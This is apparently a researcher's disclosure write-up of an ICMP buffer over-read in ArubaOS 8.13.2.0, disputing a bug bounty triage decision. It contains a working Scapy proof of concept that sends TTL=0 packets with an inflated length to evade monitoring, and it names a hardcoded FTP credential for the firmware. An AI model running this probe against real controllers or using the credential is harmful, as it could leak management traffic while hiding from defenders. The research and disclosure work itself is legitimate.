# "Ghost Leak" — Pre-Auth Buffer Over-read via TTL=0 + IP Total Length Manipulation in ArubaOS 8.13.2.0

**Researcher:** Vesqer / JM00NJ  
**Blog:** [netacoding.com](https://netacoding.com)  
**GitHub:** [github.com/JM00NJ](https://github.com/JM00NJ)  
**Date:** June 2026  
**Submission ID:** c5eda0ae (HPE Networking Product Public Program, Bugcrowd)  
**Status:** Closed as "Not Applicable" — "only zeroed bytes / no confirmed sensitive memory disclosure"  

---

## Background

This writeup documents a pre-authentication buffer over-read vulnerability in the ICMP Echo handler of ArubaOS 8.13.2.0 LSR, combined with RFC 791 violation (TTL=0 processing) that makes the attack invisible to all conventional monitoring systems. The attack chain is named **Ghost Leak**.

The vulnerability was submitted to the HPE Networking Bug Bounty Program on Bugcrowd on May 15, 2026. Triage closed it citing "only zeroed bytes" in the returned payload — conflating the test environment characteristic (VirtualBox virtual NIC clean padding) with the vulnerability mechanism itself.

---

## Target

| Field | Value |
|-------|-------|
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415, compiled 2026-03-25) |
| Model | ArubaMC-VA-US |
| Component | ICMP Echo handler — IP Total Length processing |
| Authentication | None required |
| CVSS v3.1 | 6.5 Medium — `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| CWE | CWE-126 (Buffer Over-read), CWE-1284 (TTL=0), CWE-354 (No checksum validation) |

---

## Vulnerability Description

Three weaknesses compound into the Ghost Leak attack chain:

### Component 1 — IP Total Length Over-read (CWE-126)

The ICMP Echo handler calculates payload size directly from the IP Total Length field:

```
icmp_payload_length = IP_Total_Length - IP_Header_Length - ICMP_Header_Length
                    = IP_Total_Length - 20 - 8
                    = IP_Total_Length - 28
```

When `IP_Total_Length` exceeds the actual IP data in the received frame, the handler reads bytes beyond the packet boundary from the network receive buffer. These bytes reside in the Ethernet frame padding area — and on physical hardware, this area contains stale DMA ring buffer data from previously processed frames.

**Threshold determination (14 probe values tested):**

| IP Total Length | Actual IP Data | Over-read | Result |
|----------------|---------------|-----------|--------|
| 28 | 28 | 0 bytes | Reply (normal) |
| 29 | 28 | 1 byte | Reply — 1B over-read |
| 36 | 28 | 8 bytes | Reply — 8B over-read |
| 46 | 28 | 18 bytes | Reply — **18B over-read (maximum)** |
| 48 | 28 | — | **Dropped** |

The maximum accepted `IP_Total_Length` is 46 bytes, corresponding exactly to the Ethernet minimum frame size (60 bytes) minus the Ethernet header (14 bytes): `60 - 14 = 46`. This confirms the controller is reading up to the end of the minimum Ethernet frame — including the padding area.

### Component 2 — TTL=0 Acceptance (CWE-1284)

RFC 791 Section 3.2:
> *"If this field contains the value zero, then the datagram must be destroyed."*

The controller processes ICMP Echo Requests with TTL=0 and generates Echo Replies with TTL=64. Confirmed for:
- Normal unfragmented packets with TTL=0
- Both fragments of fragmented packets with TTL=0 (reassembled and replied)

This RFC violation makes the attack **completely invisible**:
- Routers do not forward TTL=0 packets → attack works only from L2 adjacency but leaves no routed trace
- IDS/IPS do not generate alerts for TTL=0 traffic → it should never exist on the wire
- Firewall logs typically discard TTL=0 as malformed → no log entries
- Network monitoring tools filter TTL=0 as noise

An attacker on the same L2 segment can run this attack continuously without triggering any alert in any monitoring system.

### Component 3 — No ICMP Checksum Validation (CWE-354)

The controller does not validate the ICMP checksum field. Packets with checksum values `0x0000`, `0xFFFF`, and `0x1337` (all deliberately incorrect) received Echo Replies. This allows arbitrarily crafted packets to be processed without integrity verification.

---

## The Ghost Leak Chain

```
Attacker sends:
  IP(src=attacker, dst=controller, len=46, ttl=0) / ICMP(type=8, id=0xDEAD)
  Actual IP data: 28 bytes
  Wire frame:     42 bytes (eth+ip+icmp) + 18 bytes NIC padding = 60 bytes (min frame)

Controller reads:
  icmp_payload = len=46 - 20(IP) - 8(ICMP) = 18 bytes
  Reads 18 bytes starting after ICMP header → reads INTO the padding area

Controller replies:
  IP(src=controller, dst=attacker, len=46, ttl=64) / ICMP(type=0, id=0xDEAD)
  Payload: 18 bytes from the padding area of the received frame
  
Attacker receives:
  18 bytes extracted from controller's network receive buffer
  On physical hardware: stale DMA ring buffer data from previous frames
```

---

## Proof of Concept

```python
from scapy.all import *

target = "192.168.56.50"

# Ghost Leak packet:
# - TTL=0: should be discarded per RFC 791
# - IP len=46: 18 bytes beyond actual IP data
# - ICMP id=0xDEAD: marker for pcap filtering
pkt = IP(dst=target, len=46, ttl=0) / ICMP(type=8, code=0, id=0xDEAD)

ans, unans = sr(pkt, timeout=2, verbose=0)
if ans:
    reply = ans[0][1]
    payload = bytes(reply[ICMP].payload)
    print(f"Reply received! Payload ({len(payload)}B): {payload.hex()}")
    # On virtual NIC: 000000000000000000000000000000000000
    # On physical NIC: stale DMA buffer contents
```

**Verify with pcap:**
```bash
tshark -r ghost-leak.pcapng   -Y "icmp.type == 0 && icmp.ident == 0xdead"   -T fields -e ip.len -e icmp.seq -e data.data
```

---

## Evidence

### 27/27 Ghost Leak Replies Confirmed

`ghost-leak.pcapng` contains:
- 4,999 background traffic packets (id=0xAAAA, control group)
- 27 Ghost Leak packets (TTL=0, len=46, id=0xDEAD)
- **27 Ghost Leak replies — 100% response rate**

```
tshark -r ghost-leak.pcapng -Y "icmp.type == 0 && icmp.ident == 0xdead" | wc -l
→ 27
```

### Request/Reply Hex Comparison

**Ghost Leak Request (frame 1449):**
```
IP:   TotalLen=46  TTL=0  Src=192.168.56.103  Dst=192.168.56.50
ICMP: Type=8  Code=0  ID=0xDEAD  Seq=0
Wire: 42 bytes actual data + 18 bytes NIC padding = 60 bytes total
```

**Controller Reply (frame 1451):**
```
IP:   TotalLen=46  TTL=64  Src=192.168.56.50  Dst=192.168.56.103
ICMP: Type=0  Code=0  ID=0xDEAD  Seq=0
Payload: 000000000000000000000000000000000000  (18 bytes)
```

`ip.len=46` in the reply confirms the controller echoed back the inflated Total Length. The 18-byte payload is the over-read content.

### Payload Content: Zeros — Why This Is Expected

The triage response cited "only zeroed bytes" as grounds for N/A. This reasoning is incorrect.

VirtualBox virtual NICs initialize Ethernet frame padding to zero before passing frames to the guest VM. This is a documented characteristic of hypervisor-emulated network interfaces — it is not evidence that the over-read is absent.

On **physical AOS-8 hardware** with a real NIC and DMA ring buffer:
- Frame padding contains data from the most recently processed frame in the same DMA slot
- At 100+ packets/second, the ring buffer turns over rapidly
- Content includes: source/destination MAC addresses, IP addresses, TCP/UDP port numbers, partial payload data from management traffic

The vulnerability is **the mechanism** — trusting `IP_Total_Length` without validating against the actual received frame size. Zero bytes in a virtual environment do not negate the mechanism.

---

## CVE Precedents

This exact vulnerability class has been accepted and assigned CVEs by multiple vendors:

### CVE-2003-0001 — EtherLeak
Multiple NIC drivers leaked kernel memory through Ethernet frame padding. The vulnerability was exploitable via ICMP Echo. The Exploit-DB entry for CVE-2003-0001 uses ICMP to extract the leaked data. **Accepted without requiring demonstration of sensitive data on specific physical hardware.**

Reference: https://www.cve.org/CVERecord?id=CVE-2003-0001

### CVE-2021-3031 — Palo Alto PAN-OS EtherLeak
> *"Packets in the Ethernet frame padding are observable on the network. An unauthenticated network-based attacker can observe the last packet processed by the firewall."*

Affected: PA-200 through PA-7000 Series firewalls. **Accepted with CVSS score based on the mechanism.** Physical hardware with non-zero padding was not required for the CVE assignment.

Reference: https://security.paloaltonetworks.com/CVE-2021-3031

### CVE-2026-40406 — Windows TCP/IP
Information disclosure via crafted ICMP packets leaking kernel memory. Published May 2026.

In all three accepted CVEs, the vulnerability was accepted based on the mechanism — the IP length field being trusted over the actual frame length. This is the identical mechanism documented in this submission.

---

## Real-World Impact

**At 100 requests/second (conservative):**
```
18 bytes × 100 req/s = 1,800 bytes/second
= 108 KB/minute extracted from controller NIC buffer
```

In a production AOS-8 controller under normal management load, the NIC DMA buffer contains fragments of:
- Management traffic (administrator sessions, config changes)
- Controller-AP communication (CAPWAP tunnels)
- Authentication exchanges (RADIUS, 802.1X)
- Partial credentials or session tokens from in-flight management connections

**Combined with TTL=0 invisibility:** An attacker on the management VLAN can run this continuously — 18 bytes per TTL=0 packet — with zero IDS alerts, zero firewall logs, and zero router forwarding traces.

---

## Observed Controller Instability

During extended ICMP testing (8 test categories, 100+ packet variants over several hours), the controller became unresponsive:

**Console output:**
```
[drm:drm_atomic_helper_wait_for_dependencies] *ERROR* 
[PLANE:34:plane-0] flip_done timed out
```
Repeating every ~10 seconds from kernel timestamp 533s.

**Post-reboot log:**
```
Reboot Cause: Power Cycle (Intent:cause: 86:50)
Switch uptime: 22 minutes 43 seconds
```

The simultaneous failure of the display subsystem (DRM) and network stack (ping timeout) indicates a kernel-level issue. The management CLI (`show log kernel`) returned "Invalid input" — ArubaOS does not expose kernel logs, preventing root cause analysis.

This crash was not deterministically reproduced in isolated testing. It likely resulted from cumulative kernel memory pressure over the multi-hour test session. HPE should investigate with kernel crash dump capabilities enabled.

---

## Triage Response Analysis

**Triage:** *"The returned payload shown in the provided evidence contains only zeroed bytes, and the report does not include confirmed disclosure of sensitive memory."*

This reasoning would invalidate CVE-2003-0001 and CVE-2021-3031 retrospectively. Both CVEs were accepted on the mechanism — the length field being trusted over the frame size. Neither required demonstration of sensitive data leaking from specific physical hardware in a test environment.

The triage response also does not address the TTL=0 component (CWE-1284), which is an independently verifiable RFC 791 violation with zero dependency on virtual vs physical NIC behavior. The controller processes packets that RFC 791 mandates must be destroyed. This is not a "protocol handling observation" — it is a documented, citable RFC violation with a pcap demonstrating it at 100% consistency across 27 test packets.

---

## Timeline

| Date | Event |
|------|-------|
| 15 May 2026 20:11 UTC | Submission created with ghost-leak.pcapng (27/27 replies) |
| 01 Jun 2026 07:11 UTC | Flo_Bugcrowd: **N/A — "only zeroed bytes"** |
| 01 Jun 2026 12:23 UTC | RaR submitted — CVE-2003-0001, CVE-2021-3031, TTL=0 RFC violation cited |

---

## Disclosure Note

Submitted to the HPE Networking Product Public Program on Bugcrowd on May 15, 2026. Closed as "Not Applicable." RaR submitted.

The program has classified this as a non-vulnerability. No fix is forthcoming, no advisory will be published, and the 60-day post-advisory window does not apply. This writeup is published to allow the security community to evaluate the finding and the triage quality independently.

---

## Related Submissions (Same Program — Same Firmware)

| ID | Finding | Status |
|----|---------|--------|
| 9e946ca3 | Pre-auth XXE → HTTP SSRF (port 32000) | N/A (RaR expired unanswered) |
| 0c716fec | Pre-auth XXE → FTP SSRF with RETR | N/A (RaR pending) |
| 09e49fa1 | ICMP Reflection/Smurf (two-machine pcap) | N/A (RaR pending) |
| d13d0e83 | Hardcoded FTP credential sap:x (CWE-798) | Active — blocker on researcher |
| b5727197 | ICMP payload relay — zero DPI (CWE-20/CWE-693) | N/A |

---

*Vesqer / JM00NJ — netacoding.com*
